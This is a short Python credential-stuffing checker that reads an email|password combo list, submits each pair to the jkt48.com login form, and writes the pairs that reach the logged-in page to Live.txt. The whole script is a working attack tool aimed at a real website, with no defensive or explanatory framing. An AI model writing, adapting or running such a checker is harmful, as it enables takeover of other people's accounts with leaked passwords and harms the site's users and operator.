def failed(email, password):
    print(f"Die => {email}|{password}")



def passed(email, password):
    print(f"Live => {email}|{password}")
    print(f"{email}|{password}", file=open("Live.txt", "a"))


def checker(data):
    email = data[0]
    password = data[1]
    success_keyword = """<h2>My Page</h2>"""
    import requests
    api_sender = requests.session()
    source = api_sender.post("https://jkt48.com/login?lang=id", data={"login_id": email, "login_password": password}).text

    if success_keyword in source:
        passed(email, password)
    else:
        failed(email,password)

combos_name = input("Please input file txt name: ")
combos = open(combos_name, "r").readlines()
arrange = [lines.replace("\n", "")for lines in combos]
for lines in arrange:
    data = lines.split("|")
    checker(data)